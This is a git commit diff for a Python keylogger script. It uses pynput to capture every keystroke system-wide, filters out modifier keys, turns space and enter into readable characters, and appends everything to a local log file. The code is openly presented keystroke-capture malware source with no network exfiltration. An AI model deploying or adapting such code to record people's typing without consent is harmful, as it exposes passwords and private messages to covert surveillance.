7d6f243ab545ad7de2c1d746162a610beba961f5
DeadPixelz01 <deadpixelz01@gmail.com>
2019-01-09 00:40:16 -0600

    Cleaned up the script and added more key formatting support(see new dictionary)

--- main.py
+++ main.py
@@ -1,26 +1,42 @@
 # stores a user's keystrokes in a local text file
-
-# file_a = file append
-# file_r = file read
-
+# imports
+from pynput.keyboard import Listener
 file_name = 'usr_log.txt'
-
-# creates and writes to a local text file called 'usr_log'
-# this is split into 2 functions for now ('mouse_append_to_log' and 'key_append_to_log')
 
 
 # appends the user's keystrokes to a local text file
 def append_to_log(keystrokes):
     # formats keystrokes into a more readable string
     keystroke_data = str(keystrokes)
+
+    # remove quotation marks around keystrokes
     keystroke_data = keystroke_data.replace("'", "")
+
+    # dictionary of key we don't want recorded(i.e every time the user shifts or backspaces)
+    bad_keys = ['Key.shift', 'Key.backspace', 'Key.shift_r', 'Key.alt_l', 'Key.ctrl_l', 'Key.tab']
+
+    # checks keystrokes against the dictionary of 'bad characters'
+    for x in bad_keys:
+        # if the keystrokes matches a value in the dictionary...
+        if keystroke_data == str(x):
+            # replace it with nothing
+            keystroke_data = ""
+
+    # replaces the name of the key with an actual space
+    if keystroke_data == 'Key.space':
+        keystroke_data = ' '
+
+    # replaces the name of the key with an actual newline
+    if keystroke_data == 'Key.enter':
+        keystroke_data = '\n'
+
     # opens text file in append mode
     with open(file_name, 'a') as file_a:
         # appends keystrokes to the text file
         file_a.write(keystroke_data)
 
 
-# reads from a local text file (meant for admin only)
+# reads from a local text file(meant for admin only)
 def read_from_log(file):
     # reads from a local text file called 'usr_log'
     with open(file, 'r') as file_r:
@@ -28,3 +44,10 @@ def read_from_log(file):
         file_data = file_r.read()
         # prints the contents of the text file
         print(file_data)
+
+
+# listens for keyboard presses
+# on press, run the 'append_to_log' function
+with Listener(on_press=append_to_log) as key_l:
+    # join the keys together(for formatting reasons)
+    key_l.join()
